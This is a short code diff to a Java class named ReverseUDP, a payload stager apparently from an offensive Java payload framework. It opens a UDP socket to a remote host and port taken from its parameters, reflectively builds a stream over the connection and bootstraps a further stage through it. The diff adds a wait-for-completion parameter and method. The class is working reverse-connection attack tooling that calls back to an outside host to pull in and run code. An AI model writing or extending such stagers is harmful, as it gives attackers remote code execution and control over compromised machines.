@@ -44,7 +44,7 @@ import java.net.InetAddress;
 
 public class ReverseUDP extends Stager {
 
-	public void bootstrap(String[] parameters) throws Exception {
+	public void bootstrap(String[] parameters, boolean needWait) throws Exception {
 		DatagramSocket ds = new DatagramSocket();
 		InetAddress remoteAddress = InetAddress.getByName(parameters[1]);
 		int remotePort = Integer.parseInt(parameters[2]);
@@ -94,5 +94,9 @@ public class ReverseUDP extends Stager {
 			.getConstructor(new Class[] {Class.forName("java.io.OutputStream"), Class.forName("java.net.DatagramSocket"), Class.forName("java.net.InetAddress"), Integer.TYPE})
 			.newInstance(new Object[] {pipedOut, ds, remoteAddress, new Integer(remotePort)});
 		bootstrap(in, out, parameters);
+		out.getClass().getMethod("waitFinished", new Class[0]).invoke(out, new Object[0]);
+	}
+	
+	public void waitReady() throws InterruptedException {
 	}
 }
